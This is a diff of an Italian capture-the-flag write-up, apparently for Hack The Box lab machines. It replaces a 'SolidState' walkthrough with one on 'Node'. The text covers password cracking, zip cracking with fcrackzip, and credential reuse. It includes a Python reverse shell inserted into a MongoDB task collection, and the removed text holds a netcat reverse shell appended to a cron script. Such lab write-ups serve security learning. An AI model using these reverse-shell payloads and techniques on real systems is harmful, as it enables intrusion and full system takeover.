@@ -45,246 +45,185 @@ Innanzitutto, vedo cosa c'è sulla porta 3000:
   <img src="/Immagini/Linux-Box/Node/node-1.png" />
 </p>
 
-Utilizzo _dirsearch_, dal quale ottengo il seguente risultato:
+Ispezionando la pagina sorgente trovo questo:
 
 ```text
-Target: http://10.10.10.58:3000/
-
-[09:19:33] Starting:
-[09:25:52] 301 -  171B  - /assets  ->  /assets/
-[09:31:26] 301 -  173B  - /uploads  ->  /uploads/
-
-Task Completed
+<script type="text/javascript" src="vendor/jquery/jquery.min.js"></script>
+<script type="text/javascript" src="vendor/bootstrap/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="vendor/angular/angular.min.js"></script>
+<script type="text/javascript" src="vendor/angular/angular-route.min.js"></script>
+<script type="text/javascript" src="assets/js/app/app.js"></script>
+<script type="text/javascript" src="assets/js/app/controllers/home.js"></script>
+<script type="text/javascript" src="assets/js/app/controllers/login.js"></script>
+<script type="text/javascript" src="assets/js/app/controllers/admin.js"></script>
+<script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
+<script type="text/javascript" src="assets/js/misc/freelancer.min.js"></script>
 ```
 
-Non trovando nulla di interessante visito la pagina http://10.10.10.51:4555:
-
-<p align="center">
-  <img src="/Immagini/Linux-Box/SolidState/solidstate-2.png" />
-</p>
-
-Facendo una rapida ricerca tramite _searchsploit_ trovo questo:
+La pagina http://10.10.10.58:3000/assets/js/app/controllers/home.js risulta essere interessante:
 
 ```text
------------------------------------------------ ---------------------------------
- Exploit Title                                 |  Path
------------------------------------------------ ---------------------------------
-Apache James Server 2.3.2 - Insecure User Crea | linux/remote/48130.rb
-Apache James Server 2.3.2 - Remote Command Exe | linux/remote/35513.py
-Apache James Server 2.3.2 - Remote Command Exe | linux/remote/50347.py
------------------------------------------------ ---------------------------------
+var controllers = angular.module('controllers');
+
+controllers.controller('HomeCtrl', function ($scope, $http) {
+  $http.get('/api/users/latest').then(function (res) {
+    $scope.users = res.data;
+  });
+});
 ```
 
-Scarico il terzo file della lista e studio il suo funzionamento. Per poter utilizzarlo occorrono le credenziali.
-
-Provo a connettermi tramite netcat alla porta 4555:
+Visito quindi la pagina http://10.10.10.58:3000/api/users/:
 
 <p align="center">
-  <img src="/Immagini/Linux-Box/SolidState/solidstate-3.png" />
+  <img src="/Immagini/Linux-Box/Node/node-2.png" />
 </p>
+
+Provo ad utilizzare dei tool online per crackare le password:
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/Node/node-3.png" />
+</p>
+
+Così scopro le seguenti password:
+  * tom: **spongebob**
+  * mark: **snowflake**
+  * myP14ceAdm1nAcc0uNT: **manchester**
+
+Provo ad entrare con l'account _myP14ceAdm1nAcc0uNT_:
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/Node/node-4.png" />
+</p>
+
+Scarico il file di backup e provo a decodificarlo nel seguente modo:
+
+```text
+cat myplace.backup | base64 --decode > myplace-decoded.backup
+```
+
+Il risultato è un file zip protetto da una password. Provo ad utilizzare quindi il comando _fcrackzip_:
+
+```text
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup
+```
+
+La password del file è **magicword**!
+
+Dopo aver passato del tempo ad ispezionare i file ottenuti, scopro le credenziali dell'utente _mark_ nel file _app.js_:
+
+```text
+const url = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+```
 
 ## Exploitation
 
-Utilizzo il comando HELP per stampare la lista dei comandi disponibili:
-
-```text
-Currently implemented commands:
-help                                    display this help
-listusers                               display existing accounts
-countusers                              display the number of existing accounts
-adduser [username] [password]           add a new user
-verify [username]                       verify if specified user exist
-deluser [username]                      delete existing user
-setpassword [username] [password]       sets a user's password
-setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
-showalias [username]                    shows a user's current email alias
-unsetalias [user]                       unsets an alias for 'user'
-setforwarding [username] [emailaddress] forwards a user's email to another email address
-showforwarding [username]               shows a user's current email forwarding
-unsetforwarding [username]              removes a forward
-user [repositoryname]                   change to another user repository
-shutdown                                kills the current JVM (convenient when James is run as a daemon)
-quit                                    close connection
-```
-
-Utilizzo il comando _listusers_:
-
-```text
-Existing accounts 6
-user: james
-user: thomas
-user: john
-user: mindy
-user: mailadmin
-```
-
-Successivamente, utilizzo il comando _setpassword_ per cambiare la password in **password** a tutti gli utenti della lista.
-
-```text
-setpassword james password
-Password for james reset
-setpassword thomas password
-Password for thomas reset
-setpassword john password
-Password for john reset
-setpassword mindy password
-Password for mindy reset
-setpassword mailadmin password
-Password for mailadmin reset
-```
-
-Ora provo ad accedere, tramite il comando _telnet_, alla porta 110. Per farlo utilizzo le credenziali degli utenti precedentemente ottenute (e modificate).
-
-Gli unici utenti che hanno materiale interessante sono john e mindy.
-
-**JOHN**
-
-```text
-telnet 10.10.10.51 110
-Trying 10.10.10.51...
-Connected to 10.10.10.51.
-Escape character is '^]'.
-+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
-USER john
-+OK
-PASS password
-+OK Welcome john
-LIST
-+OK 1 743
-1 743
-.
-RETR 1
-+OK Message follows
-Return-Path: <mailadmin@localhost>
-Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Delivered-To: john@localhost
-Received: from 192.168.11.142 ([192.168.11.142])
-          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
-          for <john@localhost>;
-          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
-Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
-From: mailadmin@localhost
-Subject: New Hires access
-John,
-
-Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
-
-Thank you in advance.
-
-Respectfully,
-James
-
-.
-```
-
-**MINDY**
-
-```text
-telnet 10.10.10.51 110
-Trying 10.10.10.51...
-Connected to 10.10.10.51.
-Escape character is '^]'.
-+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
-USER mindy
-+OK
-PASS password
-+OK Welcome mindy
-LIST
-+OK 2 1945
-1 1109
-2 836
-.
-RETR 1
-+OK Message follows
-Return-Path: <mailadmin@localhost>
-Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Delivered-To: mindy@localhost
-Received: from 192.168.11.142 ([192.168.11.142])
-          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
-          for <mindy@localhost>;
-          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
-Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
-From: mailadmin@localhost
-Subject: Welcome
-
-Dear Mindy,
-Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
-
-We are looking forward to you joining our team and your success at Solid State Security.
-
-Respectfully,
-James
-.
-RETR 2
-+OK Message follows
-Return-Path: <mailadmin@localhost>
-Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Delivered-To: mindy@localhost
-Received: from 192.168.11.142 ([192.168.11.142])
-          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
-          for <mindy@localhost>;
-          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
-Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
-From: mailadmin@localhost
-Subject: Your Access
-
-Dear Mindy,
-
-
-Here are your ssh credentials to access the system. Remember to reset your password after your first login.
-Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.
-
-username: mindy
-pass: P@55W0rd1!2@
-
-Respectfully,
-James
-
-.
-```
-
-**Ho ottenuto le credenziali per l'utente mindy!**
-
-Ora che ho le credenziali posso utilizzarle nello script scaricato precedentemente tramite _searchsploit_:
+Provo ad accedere tramite ssh con le credeniali appena ottenute:
 
 <p align="center">
-  <img src="/Immagini/Linux-Box/SolidState/solidstate-4.png" />
+  <img src="/Immagini/Linux-Box/Node/node-5.png" />
 </p>
 
-Cosi facendo ottengo una reverse shell per l'utente mindy e conquisto il primo flag:
+Sono dentro ma non ho i premessi per leggere il file user.txt. Quindi trasferisco il file _LinEnum.sh_ attraverso un server http ed avvio lo script.
+
+Dal risultato della scansione emerge la presenza di mongodb sulla porta 27017. Provo quindi ad accedere al db utilizzando le credenziali dell'utente _mark_:
+
+```text
+mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
+```
+**Riesco ad accedere!**
+
+Scopro che esiste una collezione chiamata scheduler e che posso aggiungere un task contenente una reverse shell:
+
+```text
+db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.11\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
+```
+
+Avvio quindi avvio un listener e ottengo la shell:
 
 <p align="center">
-  <img src="/Immagini/Linux-Box/SolidState/solidstate-5.png" />
+  <img src="/Immagini/Linux-Box/Node/node-6.png" />
 </p>
-
 
 ## Privilege Escalation
 
-Scarico ed eseguo gli script _LinEnum.sh_ e _pspy_ e scopro che c'è un file _/opt/tmp.py_ che viene eseguito molto frequentemente e sul quale tutti hanno i massimi privilegi:
+Ora bisogna capire come diventare root.
 
-<p align="center">
-  <img src="/Immagini/Linux-Box/SolidState/solidstate-6.png" />
-</p>
-
-Quindi cambio il conenuto del file per creare una reverse shell con privilegi root:
+Lanciando il comando _id_ ottengo il seguente output:
 
 ```text
-echo "os.system('/bin/nc -e /bin/bash 10.10.14.8 9999')" >> /opt/tmp.py
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
 ```
 
-Avvio un listener e attendo l'esecuzione del cron job.
+Quindi ritorno sul risultato dello script _LinEnum_ e scopro che c'è un file che potrebbe essere sfruttato, ovvero _/bin/usr/bin/backup_. Inoltre, all'interno del file _/var/www/myplace/app.js_ scopro delle informazioni interessanti:
 
-**Dopo qualche minuto sono root!**
+```text
+[...]
+const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d023016710
+4d474';
+[...]
+app.get('/api/admin/backup', function (req, res) {
+    if (req.session.user && req.session.user.is_admin) {
+      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
+[...]
+```
+
+La prima è la chiave _backup_key_ e la seconda è il modo attraverso il quale è possibile lanciare il file backup.
+
+Provo quindi ad eseguire questo comando:
+
+```text
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp > backup_test.txt
+```
+
+Il risultato è una stringa in base 64, quindi provo a fare la decodifica:
+
+```text
+cat backup_test.txt | base64 --decode > backup_test_decoded.txt
+```
+
+Ottengo un file zip e provo ad estrarne il contenuto:
+
+```text
+Archive:  test-decoded
+   creating: tmp/
+   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/
+   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/tmp/
+[test-decoded] tmp/test password:
+ extracting: tmp/test                
+   creating: tmp/.Test-unix/
+  inflating: tmp/LinEnum.sh          
+   creating: tmp/.XIM-unix/
+   creating: tmp/vmware-root/
+   creating: tmp/.X11-unix/
+   creating: tmp/.ICE-unix/
+   creating: tmp/.font-unix/
+  inflating: tmp/pspy64
+```
+
+Provo ad effettuare la decodifica:
+
+```text
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root > backup_root.txt
+```
+
+```text
+cat backup_root.txt | base64 --decode > backup_root_decoded.txt
+```
+
+Passo il file sulla mia macchina e utilizzo _7z_, ottenendo questo:
 
 <p align="center">
-  <img src="/Immagini/Linux-Box/SolidState/solidstate-7.png" />
+  <img src="/Immagini/Linux-Box/Node/node-7.png" />
+</p>
+
+<p align="center">
+  .........................................................................
+</p>
+
+Prima di andare avanti su questa strada provo a fare un check sulla versione del kernel in uso e scopro, tramite _searchsploit_, che è vulnerabile ed è possibile effettuare privilage escalation.
+
+Scarico il file e lo trasferisco alla macchina node. Seguo i passaggi e divento root!
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/Node/node-8.png" />
 </p>
